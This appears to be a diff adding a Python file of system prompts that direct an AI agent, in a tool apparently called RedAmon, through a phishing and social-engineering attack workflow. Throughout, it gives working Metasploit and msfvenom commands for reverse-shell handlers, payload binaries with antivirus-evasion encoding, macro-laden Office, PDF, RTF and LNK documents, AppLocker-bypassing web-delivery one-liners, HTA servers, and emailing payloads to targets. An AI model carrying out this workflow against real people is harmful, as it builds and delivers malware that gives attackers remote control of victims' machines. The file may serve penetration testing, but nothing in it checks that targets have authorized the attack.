@@ -1,0 +1,302 @@
+"""
+RedAmon Phishing / Social Engineering Prompts
+
+Prompts for social engineering attack workflows including payload generation,
+malicious document creation, web delivery, handler setup, and email delivery.
+"""
+
+
+# =============================================================================
+# PHISHING / SOCIAL ENGINEERING MAIN WORKFLOW
+# =============================================================================
+
+PHISHING_SOCIAL_ENGINEERING_TOOLS = """
+## ATTACK PATH: PHISHING / SOCIAL ENGINEERING
+
+**CRITICAL: This attack path has been CLASSIFIED as phishing / social engineering.**
+**You MUST use the social engineering workflow below.**
+
+Focus on generating payloads, malicious documents, or web delivery mechanisms
+and delivering them to the target. Do NOT switch to CVE exploitation or brute force
+unless the user explicitly requests it.
+
+---
+
+## MANDATORY SOCIAL ENGINEERING WORKFLOW
+
+Complete these steps in order. Choose the DELIVERY METHOD that best matches the objective,
+then follow the corresponding sub-workflow.
+
+### Step 1: Determine Target Platform and Delivery Method
+
+**Ask the user (if not clear from the objective) via action="ask_user":**
+1. **Target platform**: Windows, Linux, macOS, Android, or multi-platform?
+2. **Delivery method**: Which approach?
+   - **A) Standalone Payload** — executable/script the target runs directly (exe, elf, apk, py, ps1, bash)
+   - **B) Malicious Document** — weaponized Office/PDF/RTF/LNK file
+   - **C) Web Delivery** — one-liner command the target pastes (Python/PHP/PowerShell/Regsvr32)
+   - **D) HTA Delivery** — HTML Application served from attacker-hosted URL
+
+**If the objective already specifies the platform and method, skip asking and proceed.**
+
+### Step 2: Set Up the Handler (ALWAYS — do this FIRST or IN PARALLEL)
+
+**The handler catches the callback when the target executes the payload.**
+
+Read "Pre-Configured Payload Settings" section (if present above) FIRST.
+It tells you whether to use REVERSE or BIND mode. Follow ONLY that mode's setup.
+
+**REVERSE mode handler (most common for phishing):**
+```
+use exploit/multi/handler; set PAYLOAD <payload_from_step_3>; set LHOST <LHOST>; set LPORT <LPORT>; run -j
+```
+
+**BIND mode handler (rare for phishing, target must be reachable):**
+```
+use exploit/multi/handler; set PAYLOAD <bind_payload>; set RHOST <target-ip>; set LPORT <BIND_PORT>; run -j
+```
+
+**IMPORTANT:** The handler MUST use the EXACT SAME payload as the generated artifact (Step 3).
+Mismatched payloads = the callback silently fails.
+
+Run the handler with `-j` (background job) so it waits while you prepare and deliver the payload.
+
+### Step 3: Generate the Payload/Document (choose ONE method)
+
+---
+
+#### Method A: Standalone Payload (msfvenom via `kali_shell`)
+
+Generate a payload binary/script using msfvenom:
+
+```
+kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /tmp/<output_filename>"
+```
+
+**Payload + Format Selection Matrix:**
+
+| Target OS | Payload | Format (`-f`) | Output File | Notes |
+|-----------|---------|---------------|-------------|-------|
+| Windows | `windows/meterpreter/reverse_tcp` | `exe` | `/tmp/payload.exe` | Most common Windows payload |
+| Windows | `windows/meterpreter/reverse_https` | `exe` | `/tmp/payload.exe` | Encrypted, firewall bypass |
+| Windows | `windows/shell_reverse_tcp` | `exe` | `/tmp/shell.exe` | Fallback if meterpreter fails |
+| Windows | `windows/meterpreter/reverse_tcp` | `psh` | `/tmp/payload.ps1` | PowerShell script (fileless) |
+| Windows | `windows/meterpreter/reverse_tcp` | `psh-reflection` | `/tmp/payload.ps1` | Reflective PS (AV evasion) |
+| Windows | `windows/meterpreter/reverse_tcp` | `vba` | `/tmp/payload.vba` | VBA macro code (paste into Office) |
+| Windows | `windows/meterpreter/reverse_tcp` | `hta-psh` | `/tmp/payload.hta` | HTA with embedded PowerShell |
+| Linux | `linux/x64/meterpreter/reverse_tcp` | `elf` | `/tmp/payload.elf` | Standard Linux binary |
+| Linux | `linux/x64/shell_reverse_tcp` | `elf` | `/tmp/shell.elf` | Shell fallback |
+| Linux | `cmd/unix/reverse_bash` | `raw` | `/tmp/payload.sh` | Bash one-liner |
+| Linux | `cmd/unix/reverse_python` | `raw` | `/tmp/payload.py` | Python one-liner |
+| macOS | `osx/x64/meterpreter/reverse_tcp` | `macho` | `/tmp/payload.macho` | macOS Mach-O binary |
+| Android | `android/meterpreter/reverse_tcp` | `raw` | `/tmp/payload.apk` | Android APK |
+| Java/Web | `java/meterpreter/reverse_tcp` | `war` | `/tmp/payload.war` | Java WAR (deploy to Tomcat/JBoss) |
+| Multi | `python/meterpreter/reverse_tcp` | `raw` | `/tmp/payload.py` | Python (cross-platform) |
+
+**Encoding for AV evasion (optional):**
+```
+msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/payload_encoded.exe
+```
+
+**After generation:** Verify the file was created:
+```
+kali_shell: "ls -la /tmp/payload.exe && file /tmp/payload.exe"
+```
+
+---
+
+#### Method B: Malicious Document (Metasploit fileformat modules via `metasploit_console`)
+
+Use Metasploit fileformat modules to generate weaponized documents.
+
+**B1: Word Document with VBA Macro**
+```
+use exploit/multi/fileformat/office_word_macro; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.docm; run
+```
+
+**B2: Excel Document with VBA Macro**
+```
+use exploit/multi/fileformat/office_excel_macro; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.xlsm; run
+```
+
+**B3: PDF Exploit (Adobe Reader)**
+```
+use exploit/windows/fileformat/adobe_pdf_embedded_exe; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.pdf; run
+```
+
+**B4: RTF with HTA Handler (CVE-2017-0199)**
+```
+use exploit/windows/fileformat/office_word_hta; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; set FILENAME malicious.rtf; run
+```
+This module self-hosts the HTA payload — the RTF fetches it automatically when opened.
+
+**B5: LNK File (Malicious Shortcut)**
+```
+use exploit/windows/fileformat/lnk_shortcut_ftype_append; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set FILENAME malicious.lnk; run
+```
+
+**CRITICAL: Fileformat module output location:**
+All fileformat modules save output to `/root/.msf4/local/<FILENAME>`.
+After generation, ALWAYS copy to `/tmp/` for easier access:
+```
+kali_shell: "cp /root/.msf4/local/<filename> /tmp/ && ls -la /tmp/<filename>"
+```
+
+---
+
+#### Method C: Web Delivery (Metasploit web_delivery via `metasploit_console`)
+
+Host a payload on a web server and generate a one-liner for the target to execute.
+
+```
+use exploit/multi/script/web_delivery; set TARGET <target_number>; set PAYLOAD <payload>; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT <srv_port>; run -j
+```
+
+**Target Selection:**
+
+| TARGET # | Language | One-liner runs on | Payload example |
+|----------|----------|-------------------|-----------------|
+| 0 | Python | Linux/macOS/Win with Python | `python/meterpreter/reverse_tcp` |
+| 1 | PHP | Web server with PHP | `php/meterpreter/reverse_tcp` |
+| 2 | PSH (PowerShell) | Windows | `windows/meterpreter/reverse_tcp` |
+| 3 | Regsvr32 | Windows (AppLocker bypass) | `windows/meterpreter/reverse_tcp` |
+| 4 | pubprn | Windows (script bypass) | `windows/meterpreter/reverse_tcp` |
+| 5 | SyncAppvPublishingServer | Windows (bypass) | `windows/meterpreter/reverse_tcp` |
+| 6 | PSH (Binary) | Windows | `windows/meterpreter/reverse_tcp` |
+
+**After running:** The module prints a one-liner command. Copy this — it IS the delivery payload.
+The web_delivery server runs as a background job until the target executes the one-liner.
+
+---
+
+#### Method D: HTA Delivery Server (`metasploit_console`)
+
+Host an HTA (HTML Application) that executes a payload when opened in a browser.
+
+```
+use exploit/windows/misc/hta_server; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; run -j
+```
+
+**After running:** The module prints a URL like `http://<SRVHOST>:8080/random.hta`.
+The target must visit this URL or be tricked into opening the `.hta` file.
+
+---
+
+### Step 4: Verify Payload/Document Was Generated
+
+**For msfvenom payloads (Method A):**
+```
+kali_shell: "ls -la /tmp/<filename> && file /tmp/<filename>"
+```
+
+**For fileformat modules (Method B):**
+```
+kali_shell: "ls -la /root/.msf4/local/ && cp /root/.msf4/local/<filename> /tmp/"
+```
+
+**For web_delivery / HTA server (Method C & D):**
+Confirm the job is running: `jobs` in metasploit_console.
+Note the URL or one-liner printed in the output.
+
+### Step 5: Deliver to Target
+
+#### Chat Download (default)
+Report the file location and details to the user:
+- File path: `/tmp/<filename>`
+- File size and type (from `ls -la` and `file` output)
+- Payload type and callback parameters (LHOST:LPORT)
+- Handler status (running in background)
+- Retrieval command: `docker cp redamon-kali:/tmp/<filename> ./<filename>`
+
+#### Email Delivery (if user requests)
+Use `execute_code` with Python `smtplib` to send the payload/document as an email attachment or link.
+- If "Pre-Configured SMTP Settings" section exists above, use those settings directly.
+- If NO SMTP settings are configured, **MUST** ask user via `action="ask_user"` for: SMTP host, port, username, password, sender address, and target email. Do NOT attempt to send without credentials.
+
+#### Web Delivery Link (Method C & D)
+Report the one-liner command (Method C) or URL (Method D) to the user.
+
+### Step 6: Wait for Callback and Verify Session
+
+After delivery, check if a session was established:
+```
+metasploit_console: "sessions -l"
+```
+
+**If session opens:** Request transition to `post_exploitation` phase.
+
+**If no session after reasonable wait:**
+- Verify handler is still running: `jobs` in metasploit_console
+- Verify payload matches handler: same payload type, LHOST, LPORT
+- Try a different payload format if the target platform was guessed wrong
+- Use `action="ask_user"` to ask if the target has executed the payload
+
+---
+
+## TROUBLESHOOTING
+
+| Problem | Fix |
+|---------|-----|
+| msfvenom "Invalid payload" | Check payload name: `kali_shell: "msfvenom --list payloads \\| grep <term>"` |
+| Fileformat module "exploit completed but no session" | EXPECTED — fileformat modules generate files, not sessions. Session comes when target opens the file. |
+| Handler dies immediately | Check LHOST is correct. Use `0.0.0.0` if unsure. |
+| Target executes but no callback | Check firewall/NAT. Try `reverse_https` or `bind_tcp` instead. |
+| "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
+| Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
+| **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
+"""
+
+
+# =============================================================================
+# PAYLOAD FORMAT GUIDANCE (OS-specific selection)
+# =============================================================================
+
+PHISHING_PAYLOAD_FORMAT_GUIDANCE = """
+## Payload Format Selection Guide
+
+### Decision Tree: Which format to generate?
+
+```
+Target OS?
+├── Windows
+│   ├── User will run an executable? → -f exe (payload.exe)
+│   ├── Need fileless/AV evasion? → -f psh-reflection (payload.ps1)
+│   ├── Embedding in Office document? → -f vba (payload.vba) or use Method B
+│   ├── HTA delivery? → -f hta-psh (payload.hta) or use Method D
+│   └── Java web app (Tomcat)? → -f war (payload.war)
+│
+├── Linux
+│   ├── User will run a binary? → -f elf (payload.elf)
+│   ├── User has Python? → -f raw with python payload (payload.py)
+│   └── User has bash? → -f raw with bash payload (payload.sh)
+│
+├── macOS
+│   └── User will run a binary? → -f macho (payload.macho)
+│
+├── Android
+│   └── APK install? → -f raw with android payload (payload.apk)
+│
+└── Unknown / Multi-platform
+    ├── Python available? → -f raw with python/meterpreter (payload.py)
+    └── Web server? → -f war (payload.war) or web_delivery (Method C)
+```
+
+### msfvenom Quick Reference
+
+**List payloads:** `msfvenom --list payloads | grep <os>`
+**List formats:** `msfvenom --list formats`
+**List encoders:** `msfvenom --list encoders`
+
+**Common flags:**
+- `-p <payload>` — payload to use
+- `LHOST=<ip>` — callback IP
+- `LPORT=<port>` — callback port
+- `-f <format>` — output format
+- `-o <file>` — output file path
+- `-e <encoder>` — encoder for AV evasion (e.g., `x86/shikata_ga_nai`)
+- `-i <count>` — encoding iterations
+- `-a <arch>` — architecture (x86, x64)
+- `--platform <os>` — target platform
+- `-x <template>` — embed in existing executable (trojanize)
+- `-k` — keep template functionality (with -x)
+"""
